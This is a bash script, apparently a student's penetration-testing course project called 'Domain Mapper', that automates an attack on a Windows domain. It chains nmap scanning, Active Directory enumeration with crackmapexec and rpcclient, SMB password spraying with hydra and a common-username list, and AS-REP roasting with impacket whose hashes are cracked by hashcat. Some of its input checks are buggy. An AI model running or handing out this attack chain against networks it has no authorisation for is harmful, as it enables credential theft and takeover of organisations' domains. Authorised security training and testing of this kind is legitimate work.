#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"
DARK_YELLOW="\033[0;33m"
NC="\033[0m"


#Student name : Afek Tzabari
#Student code : s16
#Unit : TMagen773634
#Lecturer : Natalie Erez

# installing toilet
sudo apt-get install toilet -y  > /dev/null 2>&1
toilet -f small "DOMAIN MAPPER"
toilet -f small -F metal -w 200 --filter border "By: Afek Tzabari"

echo "========================================="
echo "Description:"
echo "• Scan the network for ports and services."
echo "• Map vulnerabilities."
echo "• Look for login weak passwords."
echo "• Enumerate domain accounts and policies."
echo "• Attempt exploitation based on discovered data."
echo "========================================="
echo ""

USER=$(whoami)

echo "===== DOMAIN MAPPER - STEP 1: Domain Information ====="

echo ""

function AGAIN()
{
    NET
}

#function that validate if the ip is correct. Used chatgpt for this function
function VALID_NET() 
{
    # Allow both IP and IP/CIDR input
    if [[ ! $network =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/([0-9]|[1-2][0-9]|3[0-2]))?$ ]]; 
    then
        sleep 1
        echo -e "${RED}[-] Invalid network. ${NC}"
        sleep 1
        echo -e "${DARK_YELLOW}[?] Would you like to retry ? (Enter \"y\" or \"n\")${NC}"
        read answer
        
        if [ "$answer" == "y" ] || [ "$answer" == "Y" ]; then 
            AGAIN
        elif [ "$answer" == "n" ] || [ "$answer" == "N" ]; then
            echo "[~] Exiting..."
            exit 1
        fi
    fi
}


#letting the user choose if they want to change the entered network
function CHANGE_NET()
 {   
    echo -e "${DARK_YELLOW}[?] Do you want to change the selected network ? (Enter 1 to change or enter to continue)${NC}"
    read choise
    sleep 1
    
        if [ "$choise" == "1" ];
        then 
            sleep 0.5
            NET
        elif [ "$choise" = "" ];
        then    
            echo "[!] Continuing with the selected network..."
            VALID_NET
            sleep 0.5
        fi
 }


#letting the user enter a network to scan 
function NET() 
{
read -p "[~] Enter the network you would like to scan: " network
sleep 1

    if [ "$network" == "" ];
    then    
        echo -e "${RED}[-] Invalid input. Try again ${NC}"
        sleep 0.5
        AGAIN
    else
        echo -e "${GREEN}[+] The network you choose is: $network ${NC}"
        CHANGE_NET
        sleep 1
    fi
}
NET
VALID_NET

#lettin the user to enter a name for a dir to save the results
function OUTPUT_DIR() {
    while true; do
        read -p "[~] Enter the name of the directory you would like to save the results to: " output_dir
        dir_path=$(find /home -type d -name "$output_dir" 2>/dev/null)

        if [ -z "$dir_path" ]; then 
            echo -e "${GREEN}[+] Creating \"$output_dir\" on the Desktop... ${NC}"
            sleep 0.5
            mkdir -p "/home/$USER/Desktop/$output_dir"
            sleep 0.5
            echo -e "${GREEN}[+] Directory was created successfully! ${NC}"
            break
        else
            echo -e "${RED}[-] Directory name is already in use ${NC}"
            sleep 0.5
            echo -e "${DARK_YELLOW}[?] Do you want to change the name ? (Enter \"y\" or \"n\")${NC}"
            read answer2
            if [[ "$answer2" =~ ^[Nn]$ ]]; then
                echo "[~] Exiting..."
                exit 1
            fi
        fi
    done
}
OUTPUT_DIR

echo "========================================="


#1.2. Ask for the Domain name and Active Directory (AD) credentials.

while true; do
    read -p "[~] Enter the Domain name (e.g., corp.local): " DOMAIN_NAME
    if [[ -z "$DOMAIN_NAME" ]]; then
        echo -e "${RED}[X] Domain name is required. Please enter a valid domain.${NC}"
    else
        break
    fi
done


    read -p "[~] Enter Domain Username: " DOMAIN_USER
    read -s -p "[~] Enter Domain Password: " DOMAIN_PASS
    
sleep 0.5
echo ""
# Show summary of the user input
echo -e "${GREEN}[V] Domain credentials collected: ${NC}"
echo "Domain Name : $( [[ -z "$DOMAIN_NAME" ]] && echo "<none>" || echo "[$DOMAIN_NAME]" )"
echo "Username    : $( [[ -z "$DOMAIN_USER" ]] && echo "<none>" || echo "[$DOMAIN_USER]" )"
echo "Password    : $( [[ -z "$DOMAIN_PASS" ]] && echo "<none>" || echo "[HIDDEN]" )"

echo ""
echo "========================================="

#1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.

function AGAIN2() {
    PASSLIST
}
#a function that let the user input a path to wanted passlist and if none selected using the deafult
function PASSLIST() {
    read -p "[~] Enter the path to a password list [default: /usr/share/wordlists/rockyou.txt]: " PATH_TO_PASS

    if [[ -z "$PATH_TO_PASS" ]]; then
        echo -e "${DARK_YELLOW}[!] No pass list was chosen. Continuing with '/usr/share/wordlists/rockyou.txt' ${NC}"
        PASS_LIST="/usr/share/wordlists/rockyou.txt"
    else
        if [[ -f "$PATH_TO_PASS" ]]; then
            PASS_LIST="$PATH_TO_PASS"
            echo -e "${GREEN}[+] Using the pass list: '$PASS_LIST' ${NC}"
        else
            echo -e "${RED}[X] Path to the pass list is invalid ${NC}"
            read -p "[?] Would you like to retry ['y' / 'n']: " ANSWER2
            if [[ "$ANSWER2" =~ ^[Nn]$ ]]; then
                echo "[~] Exiting..."
                exit 1
            elif [[ "$ANSWER2" =~ ^[Yy]$ ]]; then
                sleep 1
                AGAIN2
            else
                echo -e "${RED}[X] Invalid response. Exiting...${NC}"
                exit 1
            fi
        fi
    fi
}
PASSLIST
echo ""

echo "===== DOMAIN MAPPER - STEP 2: Operation Levels ====="

# 1.4. Require the user to select a desired operation level (Basic, Intermediate, Advanced or
#None) for each mode: Scanning, Enumeration, Exploitation. Note: Selection of a higher level
#automatically encompasses the capabilities of the preceding levels.

echo ""
echo "[*] Choose operation level for Scanning: "

echo -e "${DARK_YELLOW}[!] Options: 

1) Basic - Fast scan with host discovery bypass
2) Intermediate - Full port scan all 65535 ports
3) Advanced - Includes UDP scan and deeper analysis ${NC}" 

echo ""

while true; do
    read -p "[~] Scanning level (1 = Basic, 2 = Intermediate, 3 = Advanced): " SCAN_LEVEL
    if [[ -z "$SCAN_LEVEL" ]]; then
        echo -e "${RED}[X] Scanning level is required. Please enter a value.${NC}"
    elif [[ ! "$SCAN_LEVEL" =~ ^[1-3]$ ]]; then
        echo -e "${RED}[X] Invalid option. Please enter 1, 2, or 3.${NC}"
    else
        break
    fi
done

echo ""

echo "[*] Choose operation level for Enumeration: (using the name or number)"
echo ""

echo -e "${DARK_YELLOW}[!] Options: 

1) Basic - Identify services running on open ports, Finding the IP of the DC and DHCP
2) Intermediate - Enumerate IP addresses running key services [ FTP, SSH, SMB...]
		  Enumerate shared folders on the network.
		  Run three useful NSE scripts for detailed domain network enumeration.
3) Advanced [needs AD creds] - List all users, groups, and shares.
	          Show password policies and disabled accounts. 
		  Find never-expiring passwords and Domain Admin members. ${NC}" 
echo ""
while true; do
    read -p "[~] Enumeration level (1 = Basic, 2 = Intermediate, 3 = Advanced): " ENUM_LEVEL
    if [[ -z "$SCAN_LEVEL" ]]; then
        echo -e "${RED}[X] Enumeration level is required. Please enter a value.${NC}"
    elif [[ ! "$SCAN_LEVEL" =~ ^[1-3]$ ]]; then
        echo -e "${RED}[X] Invalid option. Please enter 1, 2, or 3.${NC}"
    else
        break
    fi
done
echo ""

echo "[*] Choose operation level for Exploit: (using the name or number)"

echo -e "${DARK_YELLOW}[!] Options: 

1) Basic - Run NSE scripts to scan for known vulnerabilities.
2) Intermediate - Perform password spraying across the domain to find weak credentials.
3) Advanced -  Extract Kerberos tickets and try cracking them using provided passwords. ${NC}" 
echo ""
while true; do
    read -p "[~] Exploit level (1 = Basic, 2 = Intermediate, 3 = Advanced): " EXPLOIT_LEVEL
    if [[ -z "$SCAN_LEVEL" ]]; then
        echo -e "${RED}[X] Exploit level is required. Please enter a value.${NC}"
    elif [[ ! "$SCAN_LEVEL" =~ ^[1-3]$ ]]; then
        echo -e "${RED}[X] Invalid option. Please enter 1, 2, or 3.${NC}"
    else
        break
    fi
done

sleep 1
echo ""

echo -e "${GREEN}[V] Operation Levels Selected: ${NC}"
echo "Scanning     : $SCAN_LEVEL"
echo "Enumeration  : $ENUM_LEVEL"
echo "Exploitation : $EXPLOIT_LEVEL"
sleep 2
echo ""

echo "===== DOMAIN MAPPER - STEP 3: Scanning ====="

echo ""


#2.1 2.2 2.3 starting the scanning based on the user input
function SCANNING() {
    if [[ "$SCAN_LEVEL" == "1" || "$SCAN_LEVEL" == "Basic" ]]; then 
        echo -e "${GREEN}[+] Basic scan level chosen, Starting scan...${NC}" 
        nmap "$network" -Pn -oN "/home/$USER/Desktop/$output_dir/basic_scan_$network.txt"
        echo -e "${GREEN}[+] Basic scan finished. Results saved: /home/$USER/Desktop/$output_dir/basic_scan_$network.txt ${NC}" 

    elif [[ "$SCAN_LEVEL" == "2" || "$SCAN_LEVEL" == "Intermediate" ]]; then
        echo -e "${GREEN}[+] Intermediate scan level chosen, Starting scan...${NC}" 
        nmap "$network" -Pn -p- -oN "/home/$USER/Desktop/$output_dir/intermediate_scan_$network.txt"

    elif [[ "$SCAN_LEVEL" == "3" || "$SCAN_LEVEL" == "Advanced" ]]; then
        echo -e "${GREEN}[+] Advanced scan level chosen, Starting scan...${NC}" 
        nmap "$network" -sS -sU -Pn -p T:1-1024,U:1-100 -oN "/home/$USER/Desktop/$output_dir/advanced_scan_$network.txt"
    fi
}
SCANNING
sleep 1
echo""

echo "===== DOMAIN MAPPER - STEP 4: Enumeration ====="

echo ""
#3 starting the ENUMERATION
function ENUMERATION() {
	echo -e "${GREEN}[+] Starting enumeration phase...${NC}"

	if [[ "$ENUM_LEVEL" == "1" || "$ENUM_LEVEL" == "Basic" ]]; then
		echo -e "${GREEN}[+] Basic enumeration selected...${NC}"
		
		# 3.1.1 Identify services
		nmap -sV $network -oN "/home/$USER/Desktop/$output_dir/basic_services_$network.txt"
		
		# 3.1.2 Display Domain Controller IP
		echo -e "${YELLOW}[~] Domain Controller IP Address: $network ${NC}" | tee -a "/home/$USER/Desktop/$output_dir/basic_services_$network.txt"
		
		# 3.1.3 Identify DHCP Server
		echo -e "${YELLOW}[~] Attempting to detect DHCP server using sipcalc...${NC}"
		sipcalc $network | tee "/home/$USER/Desktop/$output_dir/dhcp_info_$network.txt"

	elif [[ "$ENUM_LEVEL" == "2" || "$ENUM_LEVEL" == "Intermediate" ]]; then
		echo -e "${GREEN}[+] Intermediate enumeration selected...${NC}"

		# 3.2.1 Enumerate key services
		nmap -p 21,22,445,3389,135,139,389 --script smb-enum-shares,smb-enum-users,ldap-search \
		$network -oN "/home/$USER/Desktop/$output_dir/intermediate_enum_$network.txt"

		# 3.2.2 Enumerate shared folders using enum4linux
		dc_ip=$(host "$DOMAIN_NAME" | awk '/has address/ {print $4}' | head -n1)
		enum4linux -a "$dc_ip" | tee "/home/$USER/Desktop/$output_dir/enum4linux_$dc_ip.txt"

	elif [[ "$ENUM_LEVEL" == "3" || "$ENUM_LEVEL" == "Advanced" ]]; then
		if [[ -n "$DOMAIN_USER" && -n "$DOMAIN_PASS" ]]; then
			echo -e "${GREEN}[+] Advanced enumeration selected...${NC}"
			output_path="/home/$USER/Desktop/$output_dir/advanced_enum_$network.txt"

			{
				echo "[*] Extracting all users:"
				crackmapexec smb $network -u "$DOMAIN_USER" -p "$DOMAIN_PASS" --users >> "/home/$USER/Desktop/$output_dir/users" 2>/dev/null

				echo "[*] Extracting all groups:"
				crackmapexec smb $network -u "$DOMAIN_USER" -p "$DOMAIN_PASS" --groups >> "/home/$USER/Desktop/$output_dir/groups" 2>/dev/null

				echo "[*] Extracting all shares:"
				crackmapexec smb $network -u "$DOMAIN_USER" -p "$DOMAIN_PASS" --shares >> "/home/$USER/Desktop/$output_dir/shares" 2>/dev/null

				echo "[*] Extracting password policy:"
				crackmapexec smb $network -u "$DOMAIN_USER" -p "$DOMAIN_PASS" --pass-pol >> "/home/$USER/Desktop/$output_dir/pass-pol" 2>/dev/null
				
				echo "[*] Finding disabled accounts..."
> /home/$USER/Desktop/$output_dir/disabled_accounts.txt

rpcclient -U "$DOMAIN_USER%${DOMAIN_PASS}" "$DOMAIN_NAME" -c "enumdomusers" 2>/dev/null | grep -oP '0x[0-9a-fA-F]+' > /tmp/user_rids.txt

while read -r rid; do
    result=$(rpcclient -U "$DOMAIN_USER%${DOMAIN_PASS}" "$DOMAIN_NAME" -c "queryuser $rid" 2>/dev/null)
    if echo "$result" | grep -q "Account Disabled"; then
        username=$(echo "$result" | grep "User Name" | awk -F ':' '{print $2}' | xargs)
        echo "$username ($rid) - DISABLED" >> /home/$USER/Desktop/$output_dir/disabled_accounts.txt
    fi
done < /tmp/user_rids.txt

				
				echo "[*] Finding never-expired accounts..."
> /home/$USER/Desktop/$output_dir/never_expired_accounts.txt

while read -r rid; do
    result=$(rpcclient -U "$DOMAIN_USER%${DOMAIN_PASS}" "$DOMAIN_NAME" -c "queryuser $rid" 2>/dev/null)
    if echo "$result" | grep -q "Password does not expire"; then
        username=$(echo "$result" | grep "User Name" | awk -F ':' '{print $2}' | xargs)
        echo "$username ($rid) - PASSWORD NEVER EXPIRES" >> /home/$USER/Desktop/$output_dir/never_expired_accounts.txt
    fi
done < /tmp/user_rids.txt

rm -f /tmp/user_rids.txt


			echo "[*] Listing members of Domain Admins group..."

domain_admin_rid=$(rpcclient -U "$DOMAIN_USER%${DOMAIN_PASS}" "$DOMAIN_NAME" -c "getdomgroups" 2>/dev/null | grep "Domain Admins" | awk '{print $1}')
output_file="/home/$USER/Desktop/$output_dir/domain_admins.txt"

if [[ -n "$domain_admin_rid" ]]; then
    rpcclient -U "$DOMAIN_USER%${DOMAIN_PASS}" "$DOMAIN_NAME" -c "querygroupmem $domain_admin_rid" > "$output_file" 2>/dev/null
else
    echo "[-] Could not identify RID of Domain Admins group." > "$output_file"
fi


			} | tee "$output_path"

		else
			echo -e "${RED}[!] AD credentials (DOMAIN_USER and DOMAIN_PASS) are required for advanced enumeration. Skipping...${NC}"
		fi
	else
		echo -e "${RED}[!] Invalid enumeration level selected. Please choose 1, 2, or 3.${NC}"
	fi
}

ENUMERATION
echo ""

echo "===== DOMAIN MAPPER - STEP 5: Exploit ====="
echo ""
#4  Exploitation Mode
function EXPLOITATION() {
  echo -e "${GREEN}[+] Starting exploitation phase...${NC}"

  if [[ "$EXPLOIT_LEVEL" == "1" || "$EXPLOIT_LEVEL" == "Basic" ]]; then
    echo -e "${GREEN}[+] Basic exploitation selected... Running NSE vulnerability scripts.${NC}"
    nmap -sV --script=vuln "$network" -oN "/home/$USER/Desktop/$output_dir/basic_exploit_$network.txt" >/dev/null 2>&1
    echo -e "${GREEN}[+] Basic exploitation finished and saved. ${NC}"

  elif [[ "$EXPLOIT_LEVEL" == "2" || "$EXPLOIT_LEVEL" == "Intermediate" ]]; then
    read -p "[~] Enter path to username list (leave empty to use default): " USER_LIST

    if [[ -z "$USER_LIST" ]]; then
      USER_LIST="/home/$USER/Desktop/$output_dir/usernames.txt"
      echo "[+] No path given. Creating default list with common usernames..."

      cat <<EOL > "$USER_LIST"
admin
administrator
guest
user
test
root
info
support
sales
office
help
webmaster
service
staff
mail
billing
postmaster
accounts
backup
demo
dev
testuser
sysadmin
john
EOL

      echo "${GREEN}[+] Username list created at $USER_LIST ${NC}"
    else
      if [[ -f "$USER_LIST" && "$USER_LIST" == *.txt ]]; then
        echo "${GREEN}[+] Using provided list: $USER_LIST ${NC}"
      else
        echo "${RED}[X] Invalid file. Make sure it exists and ends with .txt ${NC}"
        exit 1
      fi
    fi

    echo -e "${GREEN}[+] Intermediate exploitation selected... Running password spraying...${NC}"
    hydra -L "$USER_LIST" -P "$PASS_LIST" smb://"$network" -o /home/$USER/Desktop/$output_dir/hydra_results.txt
    
#Advanced exploit trying to extract tickets from Kerberos and cracking them
  elif [[ "$EXPLOIT_LEVEL" == "3" || "$EXPLOIT_LEVEL" == "Advanced" ]]; then
    echo -e "${GREEN}[+] Advanced exploitation selected... Extracting Kerberos tickets.${NC}"
    impacket-GetNPUsers "$DOMAIN_NAME"/ -no-pass -dc-ip "$network" -usersfile <(echo "$DOMAIN_USER") -outputfile /home/$USER/Desktop/$output_dir/asrep_hashes.txt
    echo ""
    if grep -q "Hash" /home/$USER/Desktop/$output_dir/asrep_hashes.txt; then
      echo -e "${GREEN} [+] TGT was extracted successfully. Trying to crack them with hashcat... ${NC}"
      hashcat -m 18200 /home/$USER/Desktop/$output_dir/asrep_hashes.txt "$PASS_LIST" -o /home/$USER/Desktop/$output_dir/asrep_hashes_cracked.txt --force > /dev/null 2>&1
      echo ""
      echo -e "${GREEN} [+] Complete. Everything was saved in '/home/$USER/Desktop/$output_dir/asrep_hashes_cracked.txt' ${NC}"
    else
      echo -e "${RED} [-] No Kerberos TGT were found.${NC}"
    fi

  else
    echo -e "${RED}[-] Invalid exploitation level selected.${NC}"
  fi
}
EXPLOITATION

echo ""

echo "===== DOMAIN MAPPER - STEP 6: Converting to PDF ====="
#Converting the txt files to pdf		
function CONVERT_TXT_TO_PDF() {
    echo "[*] Checking for pandoc and texlive..."

    if ! command -v pandoc >/dev/null 2>&1 || ! command -v pdflatex >/dev/null 2>&1; then
        echo "[*] Required tools not found. Installing pandoc and texlive..."
        sudo apt install pandoc texlive -y >/dev/null 2>&1
    else
        echo "[+] pandoc and texlive already installed."
    fi

    echo "[*] Cleaning .txt files and converting to .pdf..."
    for file in "/home/$USER/Desktop/$output_dir"/*.txt; do
        cleaned_file="${file%.txt}_cleaned.txt"
        pdf_file="${file%.txt}.pdf"

        tr -cd '\11\12\15\40-\176' < "$file" > "$cleaned_file"

        # Convert to PDF
        pandoc "$cleaned_file" -o "$pdf_file"

        # Optionally delete the cleaned file after conversion
        rm -f "$cleaned_file"
    done

    echo -e "${GREEN}[+] PDF conversion completed. Files are in /home/$USER/Desktop/$output_dir/${NC}"
    sleep 1
    echo -e "${GREEN}[:)] DONE. Cya next time! ${NC}"
}

CONVERT_TXT_TO_PDF

